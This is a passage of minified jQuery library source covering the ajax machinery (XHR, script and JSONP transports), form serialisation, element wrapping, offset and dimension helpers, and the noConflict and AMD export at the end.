i&&i.abort(b),x(0,b),this}};if(o.promise(v).complete=p.add,v.success=v.done,v.error=v.fail,k.url=((a||k.url||zc)+"").replace(Ac,"").replace(Fc,yc[1]+"//"),k.type=b.method||b.type||k.method||k.type,k.dataTypes=m.trim(k.dataType||"*").toLowerCase().match(E)||[""],null==k.crossDomain&&(c=Gc.exec(k.url.toLowerCase()),k.crossDomain=!(!c||c[1]===yc[1]&&c[2]===yc[2]&&(c[3]||("http:"===c[1]?"80":"443"))===(yc[3]||("http:"===yc[1]?"80":"443")))),k.data&&k.processData&&"string"!=typeof k.data&&(k.data=m.param(k.data,k.traditional)),Mc(Hc,k,b,v),2===t)return v;h=m.event&&k.global,h&&0===m.active++&&m.event.trigger("ajaxStart"),k.type=k.type.toUpperCase(),k.hasContent=!Ec.test(k.type),e=k.url,k.hasContent||(k.data&&(e=k.url+=(wc.test(e)?"&":"?")+k.data,delete k.data),k.cache===!1&&(k.url=Bc.test(e)?e.replace(Bc,"$1_="+vc++):e+(wc.test(e)?"&":"?")+"_="+vc++)),k.ifModified&&(m.lastModified[e]&&v.setRequestHeader("If-Modified-Since",m.lastModified[e]),m.etag[e]&&v.setRequestHeader("If-None-Match",m.etag[e])),(k.data&&k.hasContent&&k.contentType!==!1||b.contentType)&&v.setRequestHeader("Content-Type",k.contentType),v.setRequestHeader("Accept",k.dataTypes[0]&&k.accepts[k.dataTypes[0]]?k.accepts[k.dataTypes[0]]+("*"!==k.dataTypes[0]?", "+Jc+"; q=0.01":""):k.accepts["*"]);for(d in k.headers)v.setRequestHeader(d,k.headers[d]);if(k.beforeSend&&(k.beforeSend.call(l,v,k)===!1||2===t))return v.abort();u="abort";for(d in{success:1,error:1,complete:1})v[d](k[d]);if(i=Mc(Ic,k,b,v)){v.readyState=1,h&&n.trigger("ajaxSend",[v,k]),k.async&&k.timeout>0&&(g=setTimeout(function(){v.abort("timeout")},k.timeout));try{t=1,i.send(r,x)}catch(w){if(!(2>t))throw w;x(-1,w)}}else x(-1,"No Transport");function x(a,b,c,d){var j,r,s,u,w,x=b;2!==t&&(t=2,g&&clearTimeout(g),i=void 0,f=d||"",v.readyState=a>0?4:0,j=a>=200&&300>a||304===a,c&&(u=Oc(k,v,c)),u=Pc(k,u,v,j),j?(k.ifModified&&(w=v.getResponseHeader("Last-Modified"),w&&(m.lastModified[e]=w),w=v.getResponseHeader("etag"),w&&(m.etag[e]=w)),204===a||"HEAD"===k.type?x="nocontent":304===a?x="notmodified":(x=u.state,r=u.data,s=u.error,j=!s)):(s=x,(a||!x)&&(x="error",0>a&&(a=0))),v.status=a,v.statusText=(b||x)+"",j?o.resolveWith(l,[r,x,v]):o.rejectWith(l,[v,x,s]),v.statusCode(q),q=void 0,h&&n.trigger(j?"ajaxSuccess":"ajaxError",[v,k,j?r:s]),p.fireWith(l,[v,x]),h&&(n.trigger("ajaxComplete",[v,k]),--m.active||m.event.trigger("ajaxStop")))}return v},getJSON:function(a,b,c){return m.get(a,b,c,"json")},getScript:function(a,b){return m.get(a,void 0,b,"script")}}),m.each(["get","post"],function(a,b){m[b]=function(a,c,d,e){return m.isFunction(c)&&(e=e||d,d=c,c=void 0),m.ajax({url:a,type:b,dataType:e,data:c,success:d})}}),m._evalUrl=function(a){return m.ajax({url:a,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})},m.fn.extend({wrapAll:function(a){if(m.isFunction(a))return this.each(function(b){m(this).wrapAll(a.call(this,b))});if(this[0]){var b=m(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&1===a.firstChild.nodeType)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){return this.each(m.isFunction(a)?function(b){m(this).wrapInner(a.call(this,b))}:function(){var b=m(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=m.isFunction(a);return this.each(function(c){m(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){m.nodeName(this,"body")||m(this).replaceWith(this.childNodes)}).end()}}),m.expr.filters.hidden=function(a){return a.offsetWidth<=0&&a.offsetHeight<=0||!k.reliableHiddenOffsets()&&"none"===(a.style&&a.style.display||m.css(a,"display"))},m.expr.filters.visible=function(a){return!m.expr.filters.hidden(a)};var Qc=/%20/g,Rc=/\[\]$/,Sc=/\r?\n/g,Tc=/^(?:submit|button|image|reset|file)$/i,Uc=/^(?:input|select|textarea|keygen)/i;function Vc(a,b,c,d){var e;if(m.isArray(b))m.each(b,function(b,e){c||Rc.test(a)?d(a,e):Vc(a+"["+("object"==typeof e?b:"")+"]",e,c,d)});else if(c||"object"!==m.type(b))d(a,b);else for(e in b)Vc(a+"["+e+"]",b[e],c,d)}m.param=function(a,b){var c,d=[],e=function(a,b){b=m.isFunction(b)?b():null==b?"":b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};if(void 0===b&&(b=m.ajaxSettings&&m.ajaxSettings.traditional),m.isArray(a)||a.jquery&&!m.isPlainObject(a))m.each(a,function(){e(this.name,this.value)});else for(c in a)Vc(c,a[c],b,e);return d.join("&").replace(Qc,"+")},m.fn.extend({serialize:function(){return m.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var a=m.prop(this,"elements");return a?m.makeArray(a):this}).filter(function(){var a=this.type;return this.name&&!m(this).is(":disabled")&&Uc.test(this.nodeName)&&!Tc.test(a)&&(this.checked||!W.test(a))}).map(function(a,b){var c=m(this).val();return null==c?null:m.isArray(c)?m.map(c,function(a){return{name:b.name,value:a.replace(Sc,"\r\n")}}):{name:b.name,value:c.replace(Sc,"\r\n")}}).get()}}),m.ajaxSettings.xhr=void 0!==a.ActiveXObject?function(){return!this.isLocal&&/^(get|post|head|put|delete|options)$/i.test(this.type)&&Zc()||$c()}:Zc;var Wc=0,Xc={},Yc=m.ajaxSettings.xhr();a.attachEvent&&a.attachEvent("onunload",function(){for(var a in Xc)Xc[a](void 0,!0)}),k.cors=!!Yc&&"withCredentials"in Yc,Yc=k.ajax=!!Yc,Yc&&m.ajaxTransport(function(a){if(!a.crossDomain||k.cors){var b;return{send:function(c,d){var e,f=a.xhr(),g=++Wc;if(f.open(a.type,a.url,a.async,a.username,a.password),a.xhrFields)for(e in a.xhrFields)f[e]=a.xhrFields[e];a.mimeType&&f.overrideMimeType&&f.overrideMimeType(a.mimeType),a.crossDomain||c["X-Requested-With"]||(c["X-Requested-With"]="XMLHttpRequest");for(e in c)void 0!==c[e]&&f.setRequestHeader(e,c[e]+"");f.send(a.hasContent&&a.data||null),b=function(c,e){var h,i,j;if(b&&(e||4===f.readyState))if(delete Xc[g],b=void 0,f.onreadystatechange=m.noop,e)4!==f.readyState&&f.abort();else{j={},h=f.status,"string"==typeof f.responseText&&(j.text=f.responseText);try{i=f.statusText}catch(k){i=""}h||!a.isLocal||a.crossDomain?1223===h&&(h=204):h=j.text?200:404}j&&d(h,i,j,f.getAllResponseHeaders())},a.async?4===f.readyState?setTimeout(b):f.onreadystatechange=Xc[g]=b:b()},abort:function(){b&&b(void 0,!0)}}}});function Zc(){try{return new a.XMLHttpRequest}catch(b){}}function $c(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}m.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(a){return m.globalEval(a),a}}}),m.ajaxPrefilter("script",function(a){void 0===a.cache&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),m.ajaxTransport("script",function(a){if(a.crossDomain){var b,c=y.head||m("head")[0]||y.documentElement;return{send:function(d,e){b=y.createElement("script"),b.async=!0,a.scriptCharset&&(b.charset=a.scriptCharset),b.src=a.url,b.onload=b.onreadystatechange=function(a,c){(c||!b.readyState||/loaded|complete/.test(b.readyState))&&(b.onload=b.onreadystatechange=null,b.parentNode&&b.parentNode.removeChild(b),b=null,c||e(200,"success"))},c.insertBefore(b,c.firstChild)},abort:function(){b&&b.onload(void 0,!0)}}}});var _c=[],ad=/(=)\?(?=&|$)|\?\?/;m.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var a=_c.pop()||m.expando+"_"+vc++;return this[a]=!0,a}}),m.ajaxPrefilter("json jsonp",function(b,c,d){var e,f,g,h=b.jsonp!==!1&&(ad.test(b.url)?"url":"string"==typeof b.data&&!(b.contentType||"").indexOf("application/x-www-form-urlencoded")&&ad.test(b.data)&&"data");return h||"jsonp"===b.dataTypes[0]?(e=b.jsonpCallback=m.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,h?b[h]=b[h].replace(ad,"$1"+e):b.jsonp!==!1&&(b.url+=(wc.test(b.url)?"&":"?")+b.jsonp+"="+e),b.converters["script json"]=function(){return g||m.error(e+" was not called"),g[0]},b.dataTypes[0]="json",f=a[e],a[e]=function(){g=arguments},d.always(function(){a[e]=f,b[e]&&(b.jsonpCallback=c.jsonpCallback,_c.push(e)),g&&m.isFunction(f)&&f(g[0]),g=f=void 0}),"script"):void 0}),m.parseHTML=function(a,b,c){if(!a||"string"!=typeof a)return null;"boolean"==typeof b&&(c=b,b=!1),b=b||y;var d=u.exec(a),e=!c&&[];return d?[b.createElement(d[1])]:(d=m.buildFragment([a],b,e),e&&e.length&&m(e).remove(),m.merge([],d.childNodes))};var bd=m.fn.load;m.fn.load=function(a,b,c){if("string"!=typeof a&&bd)return bd.apply(this,arguments);var d,e,f,g=this,h=a.indexOf(" ");return h>=0&&(d=m.trim(a.slice(h,a.length)),a=a.slice(0,h)),m.isFunction(b)?(c=b,b=void 0):b&&"object"==typeof b&&(f="POST"),g.length>0&&m.ajax({url:a,type:f,dataType:"html",data:b}).done(function(a){e=arguments,g.html(d?m("<div>").append(m.parseHTML(a)).find(d):a)}).complete(c&&function(a,b){g.each(c,e||[a.responseText,b,a])}),this},m.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(a,b){m.fn[b]=function(a){return this.on(b,a)}}),m.expr.filters.animated=function(a){return m.grep(m.timers,function(b){return a===b.elem}).length};var cd=a.document.documentElement;function dd(a){return m.isWindow(a)?a:9===a.nodeType?a.defaultView||a.parentWindow:!1}m.offset={setOffset:function(a,b,c){var d,e,f,g,h,i,j,k=m.css(a,"position"),l=m(a),n={};"static"===k&&(a.style.position="relative"),h=l.offset(),f=m.css(a,"top"),i=m.css(a,"left"),j=("absolute"===k||"fixed"===k)&&m.inArray("auto",[f,i])>-1,j?(d=l.position(),g=d.top,e=d.left):(g=parseFloat(f)||0,e=parseFloat(i)||0),m.isFunction(b)&&(b=b.call(a,c,h)),null!=b.top&&(n.top=b.top-h.top+g),null!=b.left&&(n.left=b.left-h.left+e),"using"in b?b.using.call(a,n):l.css(n)}},m.fn.extend({offset:function(a){if(arguments.length)return void 0===a?this:this.each(function(b){m.offset.setOffset(this,a,b)});var b,c,d={top:0,left:0},e=this[0],f=e&&e.ownerDocument;if(f)return b=f.documentElement,m.contains(b,e)?(typeof e.getBoundingClientRect!==K&&(d=e.getBoundingClientRect()),c=dd(f),{top:d.top+(c.pageYOffset||b.scrollTop)-(b.clientTop||0),left:d.left+(c.pageXOffset||b.scrollLeft)-(b.clientLeft||0)}):d},position:function(){if(this[0]){var a,b,c={top:0,left:0},d=this[0];return"fixed"===m.css(d,"position")?b=d.getBoundingClientRect():(a=this.offsetParent(),b=this.offset(),m.nodeName(a[0],"html")||(c=a.offset()),c.top+=m.css(a[0],"borderTopWidth",!0),c.left+=m.css(a[0],"borderLeftWidth",!0)),{top:b.top-c.top-m.css(d,"marginTop",!0),left:b.left-c.left-m.css(d,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||cd;while(a&&!m.nodeName(a,"html")&&"static"===m.css(a,"position"))a=a.offsetParent;return a||cd})}}),m.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(a,b){var c=/Y/.test(b);m.fn[a]=function(d){return V(this,function(a,d,e){var f=dd(a);return void 0===e?f?b in f?f[b]:f.document.documentElement[d]:a[d]:void(f?f.scrollTo(c?m(f).scrollLeft():e,c?e:m(f).scrollTop()):a[d]=e)},a,d,arguments.length,null)}}),m.each(["top","left"],function(a,b){m.cssHooks[b]=Lb(k.pixelPosition,function(a,c){return c?(c=Jb(a,b),Hb.test(c)?m(a).position()[b]+"px":c):void 0})}),m.each({Height:"height",Width:"width"},function(a,b){m.each({padding:"inner"+a,content:b,"":"outer"+a},function(c,d){m.fn[d]=function(d,e){var f=arguments.length&&(c||"boolean"!=typeof d),g=c||(d===!0||e===!0?"margin":"border");return V(this,function(b,c,d){var e;return m.isWindow(b)?b.document.documentElement["client"+a]:9===b.nodeType?(e=b.documentElement,Math.max(b.body["scroll"+a],e["scroll"+a],b.body["offset"+a],e["offset"+a],e["client"+a])):void 0===d?m.css(b,c,g):m.style(b,c,d,g)},b,f?d:void 0,f,null)}})}),m.fn.size=function(){return this.length},m.fn.andSelf=m.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],function(){return m});var ed=a.jQuery,fd=a.$;return m.noConflict=function(b){return a.$===m&&(a.$=fd),b&&a.jQuery===m&&(a.jQuery=ed),m},typeof b===K&&(a.jQuery=a.$=m),m});

